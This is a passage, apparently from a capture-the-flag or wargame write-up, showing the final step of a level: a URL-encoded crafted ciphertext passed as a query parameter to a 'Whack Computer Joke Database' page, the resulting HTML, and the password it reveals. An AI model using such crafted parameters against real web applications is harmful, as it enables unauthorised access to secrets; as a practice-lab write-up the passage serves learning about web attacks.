G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6OeWnPci%2FqKte0ohRTkObF%2BT5ujPcGtKfnu%2FmSL%2FsyLoz0xm5xtyst2O9VZ%2FszQKTUzQlejQ9qtqvLA46HXHOA90Xt7rKZV8pijIekOP3pg1Ng%3D
```
- Passing this as the query parameter results in the following output:
```html
<div id="content">
<h2> Whack Computer Joke Database</h2>
<ul>
	<li>31F4j3Qi2PnuhIZQokxXk1L3QT9Cppns</li>
</ul>
</div>
```
- We have finally obtained the password: 31F4j3Qi2PnuhIZQokxXk1L3QT9Cppns